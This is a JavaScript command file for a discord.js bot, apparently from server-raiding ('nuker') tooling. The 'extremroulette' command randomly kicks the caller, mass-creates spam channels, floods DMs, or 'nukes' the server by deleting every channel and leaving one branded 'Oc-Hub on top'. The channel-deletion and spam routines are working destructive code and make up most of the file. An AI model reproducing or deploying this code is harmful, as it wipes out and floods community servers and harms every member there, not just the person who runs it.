const Discord = require('discord.js');
const db = require('megadb');
const blacklist = new db.crearDB("blacklist");
const serverlist = new db.crearDB("serverlist");
const color = '0x410255';
const ms = require('ms');

let cooldown = new Set();

module.exports = {
  name: "extremroulette",
  alias: ["eroulette"],

  async execute(client, message, args){

    if (serverlist.tiene(message.guild.id)){
        const serverInListEmbed = new Discord.MessageEmbed()
            .setDescription("<:Converter:995595217782718475> This command is not available in this server.")
            .setColor(color);
          return message.reply({ embeds: [serverInListEmbed] });
        }

        if(!blacklist.has(message.author.id)){
            const a = new Discord.MessageEmbed()
            .setDescription("You are not registered in the Whitelist.")
            .setColor(color)
             return message.reply({embeds: [a]})
          }

    const time = ms('11s')

    if(cooldown.has(message.author.id)){
      const l = new Discord.MessageEmbed()
      .setDescription(`<:Converter:995595217782718475> ${message.author}, you must wait 11 seconds to use the command.`)
      .setColor(color)
      return message.reply({embeds: [l]})
    }

    cooldown.add(message.author.id);

    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, time);

    const requiredPermissions = ["MANAGE_MESSAGES", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "SEND_MESSAGES", "MANAGE_CHANNELS"]
    const missingPermissions = requiredPermissions.filter(permission => !message.guild.me.permissions.has(permission))
    if(missingPermissions.length > 0) {
      const lala = new Discord.MessageEmbed()
      .setDescription("<:Converter:995595217782718475> I don't have the permissions to do this.\nRequired permissions: *`MANAGE_MESSAGES`*, *`KICK_MEMBERS`*, *`CREATE_INSTANT_INVITE`*, *`SEND_MESSAGES`*, *`MANAGE_CHANNELS`*.")
      .setColor(color)
      return message.channel.send({embeds: [lala]})
    }

    var perms = message.member.permissions.has("ADMINISTRATOR")
    if(!perms){
      const uwu = new Discord.MessageEmbed()
      .setDescription("<:Converter:995595217782718475> You do not have permissions. You need `ADMINISTRATOR`.")
      .setColor(color)
      return message.reply({embeds: [uwu]})
    }

    try {

       const user = message.author;
    
      const lala = new Discord.MessageEmbed()
      .setDescription("<a:Pepe_Cowboy:952323091743248434> Wait for your result...")
      .setImage("https://j.gifs.com/vn811z.gif")
      .setColor(color)

        let resultadomalo = ['mal'];
        let resultadospam = ['spam'];
        let resultadospamdm = ['spamdm'];
        let resultadonuke = ['nuke'];
        let resultadolol = ['lol'];
        let resultadobueno = ['bien'];
        let resultado = [resultadobueno, resultadomalo, resultadospam, resultadospamdm, resultadobueno, resultadobueno, resultadobueno, resultadobueno, resultadospamdm, resultadospamdm, resultadospamdm, resultadomalo, resultadonuke, resultadolol, resultadobueno, resultadolol, resultadobueno, resultadolol, resultadolol, resultadobueno, resultadolol, resultadolol];
        let resultadofinal = resultado[Math.floor(Math.random() * resultado.length)];

        if (resultadofinal === resultadomalo) {
          const expulsado = new Discord.MessageEmbed()
          .setAuthor({name: client.user.username, iconURL: client.user.displayAvatarURL({format: 'png'})})
          .setDescription(`\`${message.author.tag}\` was kicked. <a:custom_emoji:1215555396001865800>`)
          .setColor(color);
          message.channel.send({embeds: [lala]}).then(m => {
            setTimeout(() => {
              m.edit({embeds: [expulsado]})
            }, 5000)
        })
          await message.member.kick().catch(err => {
             return message.reply("I couldn't kick the user. Please check my permissions.")
           })
          
          const serverID = message.guild.id;
          const server = client.guilds.cache.get(serverID);

           const inviteChannel = server.channels.cache.find((channel) => channel.type === 'GUILD_TEXT' && channel.permissionsFor(client.user).has('CREATE_INSTANT_INVITE'))

           const invite = await inviteChannel.createInvite({ maxAge: 0, unique: true })

          message.author.send(invite.url).catch(err => {
            console.log(err)
          })
        }
      

      if(resultadofinal === resultadospam) {
        const expulsado = new Discord.MessageEmbed()
          .setAuthor({name: client.user.username, iconURL: client.user.displayAvatarURL({format: 'png'})})
          .setDescription(`\`${message.author.tag}\` You received spamchannel. <a:custom_emoji:1215555396001865800>`)
          .setColor(color);
          message.channel.send({embeds: [lala]}).then(m => {
            setTimeout(() => {
              m.edit({embeds: [expulsado]})
            }, 5000)
        })
        
        for(let i = 0; i <= 50; i++) {
          if(message.guild.channels.cache.size >= 500){
             break;
           }
           message.guild.channels.create(`Oc-Hub on top`, { type: "GUILD_TEXT" }).catch((err) => { console.log(("Error Found: " + err)) })
        }
      }

        if(resultadofinal === resultadospamdm) {
          const expulsado = new Discord.MessageEmbed()
            .setAuthor({name: client.user.username, iconURL: client.user.displayAvatarURL({format: 'png'})})
            .setDescription(`\`${message.author.tag}\` You received spamdm. <a:custom_emoji:1215555396001865800>`)
            .setColor(color);
            message.channel.send({embeds: [lala]}).then(m => {
              setTimeout(() => {
                m.edit({embeds: [expulsado]})
              }, 5000)
          })

          for(let i = 0; i <= 50; i++) {
           user.send("😂").catch(e => {
             if (e) {
               return message.reply("I couldn't send the spamdm!")
             }
           })
          }
        }

      if (resultadofinal === resultadonuke) {

        message.guild.channels.cache.forEach((ch) => {
        const botPermissions = ch.permissionsFor(message.guild.me);
          if (botPermissions && botPermissions.has("MANAGE_CHANNELS")) {
            ch.delete().catch((err) => {
              console.log("Error Found: " + err);
            });
          }
        });

        for (let i = 0 ; i < 1; ++i) {
          message.guild.channels.create(`Oc-Hub on top`, { type: "GUILD_TEXT"}).catch(err => {
            return;
          }).then(channel => {
            const e = new Discord.MessageEmbed()
            .setAuthor({name: client.user.username, iconURL: client.user.displayAvatarURL({format: 'png'})})
            .setDescription(`\`${message.author.tag}\` You received nuke. <a:custom_emoji:1215555396001865800>`)
            .setColor(color)
            channel.send({embeds: [e]})
          })
        }
      }
      

        if (resultadofinal === resultadobueno) {
          const lol = new Discord.MessageEmbed()
          .setAuthor({name: client.user.username, iconURL: client.user.displayAvatarURL({format: 'png'})})
          .setDescription(`\`${message.author.tag}\` good luck.`)
          .setColor(color)
          message.channel.send({embeds: [lala]}).then(m => {
            setTimeout(() => {
              m.edit({embeds: [lol]})
            }, 5000)
          })
        }

      if (resultadofinal === resultadolol) {
        const lol = new Discord.MessageEmbed()
        .setAuthor({name: client.user.username, iconURL: client.user.displayAvatarURL({format: 'png'})})
        .setDescription(`\`${message.author.tag}\` good luck.`)
        .setColor(color)
        message.channel.send({embeds: [lala]}).then(m => {
          setTimeout(() => {
            m.edit({embeds: [lol]})
          }, 5000)
        })
      }



    } catch (err) {
      console.log(err)
    }
  
  }
}